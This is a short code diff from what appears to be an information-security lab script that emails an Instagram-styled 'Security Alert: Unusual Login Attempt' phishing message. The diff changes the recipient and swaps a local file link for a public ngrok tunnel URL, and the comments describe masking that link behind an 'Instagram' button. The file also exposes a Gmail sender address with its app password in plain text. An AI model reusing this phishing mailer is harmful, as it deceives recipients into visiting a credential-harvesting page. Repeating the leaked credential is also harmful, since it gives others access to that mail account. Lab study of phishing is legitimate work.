@@ -7,11 +7,11 @@ smtp_server = "smtp.gmail.com"
 smtp_port = 587
 sender_email = "alrentru@gmail.com"  
 sender_password = "sipivolbuzjsfjno" # Your app-specific password
-receiver_email = "sdkbkv@gmail.com" # The email you want to send it to
+receiver_email = " nurkyz.sydykbekova1@gmail.com" # The email you want to send it to
 
 # 2. Credible Link Logic
 # Masking the file path behind a button or "Instagram" text
-technical_link = "file:///Users/nur/Documents/infosec/lab4/index.html"
+technical_link = " https://uninterruptive-gael-pennate.ngrok-free.dev"
 
 # 3. HTML Content (Modern Instagram Design)
 subject = "Security Alert: Unusual Login Attempt"
